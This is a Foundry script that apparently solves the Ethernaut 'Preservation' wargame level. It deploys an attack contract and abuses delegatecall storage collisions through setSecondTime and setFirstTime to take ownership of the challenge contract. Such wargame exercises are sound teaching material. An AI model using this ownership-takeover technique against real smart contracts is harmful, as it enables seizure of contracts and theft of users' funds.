// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script} from "forge-std/Script.sol";
import {console} from "forge-std/console.sol";
import {Preservation} from "../src/Preservation.sol";
import {PreservationAttack} from "../src/PreservationAttack.sol";

contract PreservationScript is Script {
    function develop() public returns(address) {
        vm.startBroadcast();
        PreservationAttack attack = new PreservationAttack();
        vm.stopBroadcast();

        console.log("attack develop on %s", address(attack));

        return address(attack);
    }

    function run(address _preservation, address _attack, address _player) public {
        vm.startBroadcast();
        Preservation preservation = Preservation(_preservation);
        PreservationAttack attack = PreservationAttack(_attack);

        preservation.setSecondTime(uint256(uint160(_attack)));

        console.log("preservation timeZone1 %s", preservation.timeZone1Library());

        preservation.setFirstTime(uint256(uint160(_player)));

        console.log("owner %s", preservation.owner());

        vm.stopBroadcast();
    }

    function runAndDevelop() public {
        address preservation = 0x7DFF31EFAC9DDD28C169e782f11E164667EE27D2;
        address player = 0xa3e7317E591D5A0F1c605be1b3aC4D2ae56104d6;
        address attack = develop();

        run(preservation, attack, player);
    }
}